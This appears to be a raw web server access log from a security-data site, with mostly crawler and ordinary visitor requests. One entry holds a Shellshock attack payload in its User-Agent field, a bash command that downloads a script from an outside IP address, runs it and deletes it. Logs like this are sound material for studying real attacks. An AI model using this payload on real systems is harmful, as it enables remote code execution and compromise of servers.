77.75.79.109 - - [28/Feb/2016:12:21:30 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.79.109 - - [28/Feb/2016:12:21:31 -0800] "GET /self.logs/access.log.2015-06-14.gz HTTP/1.1" 200 4386 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
218.200.66.203 - - [28/Feb/2016:12:23:04 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.201 - - [28/Feb/2016:12:23:47 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.172 - - [28/Feb/2016:12:25:10 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
95.90.193.172 - - [28/Feb/2016:12:26:39 -0800] "GET /tg/a.zip HTTP/1.1" 200 11000740 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
95.90.193.172 - - [28/Feb/2016:12:26:39 -0800] "GET /tg/a.zip HTTP/1.1" 200 14992360 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
95.90.193.172 - - [28/Feb/2016:12:26:39 -0800] "GET /tg/a.zip HTTP/1.1" 200 7827040 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
95.90.193.172 - - [28/Feb/2016:12:26:39 -0800] "GET /tg/a.zip HTTP/1.1" 200 5387480 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
40.77.167.89 - - [28/Feb/2016:12:40:56 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)" 
92.52.20.230 - - [28/Feb/2016:12:51:14 -0800] "GET / HTTP/1.1" 200 8680 "https://www.google.sk/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
92.52.20.230 - - [28/Feb/2016:12:51:14 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
92.52.20.230 - - [28/Feb/2016:12:51:15 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
92.52.20.230 - - [28/Feb/2016:12:51:15 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
111.7.128.40 - - [28/Feb/2016:12:54:11 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
111.23.10.33 - - [28/Feb/2016:13:06:37 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.118 - - [28/Feb/2016:13:13:21 -0800] "GET /self.logs/error.log.2015-02-07.gz HTTP/1.1" 200 697 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
77.75.76.166 - - [28/Feb/2016:13:17:43 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.76.166 - - [28/Feb/2016:13:17:45 -0800] "GET /self.logs/error.log.2015-06-16.gz HTTP/1.1" 200 747 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
185.106.92.142 - - [28/Feb/2016:13:26:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 418 732 "-" "() { :;}; /bin/bash -c \"curl -O http://52.91.23.21/al.sh -O /tmp/al.sh; lwp-download -a http://52.91.23.21/al.sh /tmp/al.sh;wget http://52.91.23.21/al.sh -O /tmp/al.sh;busybox wget http://52.91.23.21/al.sh -O /tmp/al.sh;sh /tmp/al.sh;rm -fr /tmp/al.sh\"" 
141.8.143.159 - - [28/Feb/2016:13:54:11 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
40.77.167.89 - - [28/Feb/2016:14:07:44 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.89 - - [28/Feb/2016:14:07:44 -0800] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.89 - - [28/Feb/2016:14:08:01 -0800] "GET /self.logs/access.log.2015-08-19.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
217.69.133.240 - - [28/Feb/2016:14:08:51 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
217.69.133.236 - - [28/Feb/2016:14:08:52 -0800] "GET /self.logs/ HTTP/1.1" 200 8577 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
